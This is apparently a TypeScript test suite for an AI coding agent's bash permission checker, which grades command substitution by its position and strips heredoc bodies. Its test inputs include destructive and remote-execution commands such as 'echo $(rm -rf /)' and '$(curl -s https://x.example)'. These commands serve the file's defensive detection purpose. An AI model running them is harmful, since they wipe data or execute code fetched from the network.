/**
 * 命令替换按「位置」判定 + heredoc 正文剥离（B7，2026-11-14）
 *
 * ## 修的是什么
 *
 * `DANGEROUS_PATTERNS` 里原来的正则 `/`…`|\$\([^)]*\)/` 把**所有**命令替换判成
 * 「命令替换注入」high，不看替换出现在什么位置。于是两个方向同时错：
 *
 * - **误报**：`echo $(git rev-parse HEAD)`、`d=$(ls -d <glob> | head -1) && …`、
 *   `for d in $(ls …)` 全是「危险命令」红框。级别没错（可确认），但语义错了——
 *   这些替换在**参数位**，内层命令已经作为独立 variant 过完整套危险判定。
 * - **漏报**：`cat <<EOF ⏎ $(rm -rf /) ⏎ EOF` 修前在 always-allow 下直接放行
 *   （正文不剥时 `=(` 反而被 injection 层误报成 Zsh 进程替换）。
 *
 * 修后判据：**替换的位置**决定级别。
 * - 命令位（`$(curl x)`、`` `cat f` ``、`sudo $(cat f)`）→ high
 * - 参数即代码（`sh -c "$(…)"` / `eval` / `source` / `.`）→ high
 * - 参数位 → 不报，内层命令由 variants 单独判
 * - 引号没闭合 / 展开超限 → high（fail-closed）
 *
 * ## 为什么用真实 PermissionChecker
 *
 * 用户感知的是「这条命令能不能跑」。`detectCommandSubstitutionDanger` 返回 null
 * 不等于命令会被放行——还要看 `isReadOnlyCommand` 与模式档。反过来，降级后
 * `decisionReason.type` 必须是 `undefined`（普通确认框），不能还是
 * `dangerousCommand`（红框）——这一层只有端到端判定看得见。
 *
 * ⚠ 落盘隔离：PermissionChecker 构造 AuditLogger，SID_CONFIG_DIR 重定向到 tmpdir，
 * 恢复时存/恢复原值（同批多文件跑在一个进程里，无条件 delete 会抹掉 preload 兜底）。
 */
import { describe, test, expect, beforeEach, afterEach } from "bun:test";
import { mkdtempSync, realpathSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { PermissionChecker } from "@sid-code/core/permission/checker.ts";
import { defaultConfig } from "@sid-code/core/config/config.ts";
import { isReadOnlyCommand } from "@sid-code/core/tool/bash/read-only-validation.ts";

let configRoot: string;
let ws: string;
let prevConfigDir: string | undefined;

beforeEach(() => {
  configRoot = mkdtempSync(join(tmpdir(), "sid-subst-cfg-"));
  ws = realpathSync(mkdtempSync(join(tmpdir(), "sid-subst-ws-")));
  prevConfigDir = process.env.SID_CONFIG_DIR;
  process.env.SID_CONFIG_DIR = configRoot;
});

afterEach(() => {
  if (prevConfigDir === undefined) delete process.env.SID_CONFIG_DIR;
  else process.env.SID_CONFIG_DIR = prevConfigDir;
  rmSync(configRoot, { recursive: true, force: true });
  rmSync(ws, { recursive: true, force: true });
});

async function verdict(cmd: string, permissionMode: "default" | "always-allow") {
  const checker = new PermissionChecker(
    { ...defaultConfig(), permissionMode } as never,
    undefined,
    ws,
  );
  const r = await checker.check({ toolName: "bash", input: { command: cmd, cwd: ws } });
  const dr = r.decisionReason as { type?: string; pattern?: string; severity?: string } | undefined;
  return {
    allowed: r.allowed,
    needsConfirmation: r.needsConfirmation,
    reasonType: dr?.type,
    pattern: dr?.pattern,
    severity: dr?.severity,
  };
}

// ─────────────────────────────────────────────────────────────────────────────
// A. 参数位替换：修前 dangerousCommand high（红框），修后普通确认
// ─────────────────────────────────────────────────────────────────────────────

describe("A. 参数位替换：default 普通确认（不是危险命令框），always-allow 放行", () => {
  const cases: Array<[string, string]> = [
    ["`echo $(…)` 内层是只读 git", "echo $(git rev-parse HEAD)"],
    ["反引号参数位", "echo `date`"],
    ["赋值右侧的替换", `d=$(ls -d */ | head -1) && echo "session=$d"`],
    ["for 列表里的替换", `for d in $(ls -dt /tmp/x-* 2>/dev/null | head -8); do echo "$d"; done`],
    ["git 参数里的替换", "git branch --contains $(git rev-parse HEAD)"],
  ];

  for (const [label, cmd] of cases) {
    test(`${label}：普通确认`, async () => {
      const v = await verdict(cmd, "default");
      expect(v.needsConfirmation).toBe(true);
      // 关键：降级后不能还是「危险命令」红框
      expect(v.reasonType).not.toBe("dangerousCommand");
      expect(v.pattern).not.toBe("命令替换注入");
    });

    test(`${label}：always-allow 放行`, async () => {
      expect((await verdict(cmd, "always-allow")).allowed).toBe(true);
    });
  }
});

// ─────────────────────────────────────────────────────────────────────────────
// B. 命令位 / 参数即代码：替换结果被当命令执行，静态看不穿 → 保持 high
// ─────────────────────────────────────────────────────────────────────────────

describe("B. 命令位 / 参数即代码：保持 dangerousCommand high", () => {
  const cases: Array<[string, string]> = [
    ["整条命令就是替换", "$(curl -s https://x.example)"],
    ["反引号整条命令", "`cat cmd.txt`"],
    ["sh -c 的脚本参数", 'sh -c "$(cat x)"'],
    ["eval 的参数", 'eval "$(x)"'],
    ["source 的参数", 'source "$(x)"'],
    ["点命令的参数", '. "$(x)"'],
    ["if 条件里的替换", "if $(cat cmd); then echo hi; fi"],
    ["分号后的替换（段首）", "echo hi; $(cat cmd)"],
    // 「换行后的替换（段首）」不在这一组：`splitShellSubcommands` 还不把换行当命令分隔符
    // （D3 缺口），危险命令层认不出「换行之后的命令位」。修前它能通过本组断言，是因为
    // injection 的 `newlines` 硬编码了 high——2026-11-18 A4 改成如实透传 `ask` 后就露出来了。
    // 单列在下面，等危险层补上换行切分再收回本组。
    ["xargs 的程序位", "xargs $(cat cmd)"],
    ["find -exec 的程序位", "find . -exec $(cat cmd) {} \\;"],
    // sudo 由 detectPrivilegeEscalation 先命中，名字是「sudo 命令」，级别同样是 high
    ["sudo 的程序位", "sudo $(cat cmd)"],
  ];

  for (const [label, cmd] of cases) {
    test(label, async () => {
      const v = await verdict(cmd, "default");
      expect(v.needsConfirmation).toBe(true);
      expect(v.reasonType).toBe("dangerousCommand");
      expect(v.severity).toBe("high");
      // always-allow 越不过危险确认
      expect((await verdict(cmd, "always-allow")).needsConfirmation).toBe(true);
    });
  }

  test("换行后的替换（段首）：危险层尚未覆盖，由 injection newlines 兜底（ask）", async () => {
    // A4 之后注入层不再伪装成 high，这条如实报 ask。**处置不变**（仍要确认，
    // always-allow 也越不过），变的是 severity 标签与遥测口径。
    // 危险层一旦把换行当命令分隔符（D3），这条应升回 high 并收回上面的 cases 数组。
    const v = await verdict("echo hi\n$(cat cmd)", "default");
    expect(v.needsConfirmation).toBe(true);
    expect(v.reasonType).toBe("dangerousCommand");
    expect(v.pattern).toBe("injection:newlines");
    expect(v.severity).toBe("ask");
    expect((await verdict("echo hi\n$(cat cmd)", "always-allow")).needsConfirmation).toBe(true);
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// C. 内层危险仍按内层判：降级只降「外层看不穿」，不降「内层已知危险」
// ─────────────────────────────────────────────────────────────────────────────

describe("C. 参数位替换的内层危险仍命中 critical", () => {
  test("echo $(rm -rf /) → critical（不是 high）", async () => {
    const v = await verdict("echo $(rm -rf /)", "default");
    expect(v.allowed).toBe(false);
    expect(v.needsConfirmation).not.toBe(true);
    expect(v.severity).toBe("critical");
    expect(v.pattern).toBe("递归删除根目录");
  });

  test('sh -c "$(rm -rf /)" → critical（内层同时命中命令位）', async () => {
    const v = await verdict('sh -c "$(rm -rf /)"', "default");
    expect(v.allowed).toBe(false);
    expect(v.needsConfirmation).not.toBe(true);
    expect(v.severity).toBe("critical");
  });

  test("不带引号 heredoc 正文里的替换会执行：cat <<EOF $(rm -rf /) → critical", async () => {
    const cmd = ["cat <<EOF", "$(rm -rf /)", "EOF"].join("\n");
    const v = await verdict(cmd, "default");
    expect(v.allowed).toBe(false);
    expect(v.severity).toBe("critical");
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// D. 解析失败 / 展开超限：fail-closed
// ─────────────────────────────────────────────────────────────────────────────

describe("D. 解析失败与展开超限保持 high", () => {
  test("引号没闭合：内层命令提不出来 → high（修前 always-allow 静默放行）", async () => {
    const v = await verdict('echo "$(date', "default");
    expect(v.reasonType).toBe("dangerousCommand");
    expect(v.severity).toBe("high");
    expect(v.pattern).toBe("命令替换注入");
  });

  test("嵌套超限 → 「展开超限」high", async () => {
    const cmd = "echo $(echo $(echo $(echo $(echo $(echo hi)))))";
    const v = await verdict(cmd, "default");
    expect(v.reasonType).toBe("dangerousCommand");
    expect(v.pattern).toBe("展开超限");
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// E. heredoc 正文剥离：正文里的 =( / <( 不是命令，不该被 injection 层扫
// ─────────────────────────────────────────────────────────────────────────────

describe("E. heredoc 正文不再误报 injection:command-substitution", () => {
  const cases: Array<[string, string]> = [
    [
      "Python 元组赋值 =( 带引号",
      ["python3 - <<'EOF'", "msgs=(o.get('x') or {})", "EOF"].join("\n"),
    ],
    ["bash 数组赋值 =( 带引号", ["cat <<'EOF'", "a=(1 2)", "EOF"].join("\n")],
    ["bash 数组赋值 =( 不带引号", ["cat <<EOF", "a=(1 2)", "EOF"].join("\n")],
    ["日志正文里的 <( 带引号", ["cat <<'EOF'", "diff <(a) <(b)", "EOF"].join("\n")],
  ];

  for (const [label, cmd] of cases) {
    test(`${label}：不再是 injection high`, async () => {
      const v = await verdict(cmd, "default");
      expect(v.pattern).not.toBe("injection:command-substitution");
      expect(v.reasonType).not.toBe("dangerousCommand");
    });

    test(`${label}：always-allow 放行`, async () => {
      expect((await verdict(cmd, "always-allow")).allowed).toBe(true);
    });
  }

  test("负向对照：正文之外的进程替换仍然报", async () => {
    const v = await verdict("diff <(ls a) <(ls b)", "default");
    expect(v.reasonType).toBe("dangerousCommand");
    expect(v.pattern).toBe("injection:command-substitution");
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// F. isReadOnlyCommand 口径：含替换 ≠ 只读
// ─────────────────────────────────────────────────────────────────────────────

describe("F. isReadOnlyCommand：含命令替换判非只读，算术展开不算", () => {
  test("含替换 → false（Step 5.5 不能自动放行）", () => {
    expect(isReadOnlyCommand("echo $(git rev-parse HEAD)")).toBe(false);
    expect(isReadOnlyCommand("echo `date`")).toBe(false);
    expect(isReadOnlyCommand("diff <(ls a) <(ls b)")).toBe(false);
  });

  test("算术展开 $((…)) 不是命令替换 → 仍是只读", () => {
    expect(isReadOnlyCommand("echo $((1 + 2))")).toBe(true);
  });

  test("对照：纯只读命令口径不变", () => {
    expect(isReadOnlyCommand("echo hi")).toBe(true);
    expect(isReadOnlyCommand("git status")).toBe(true);
  });
});
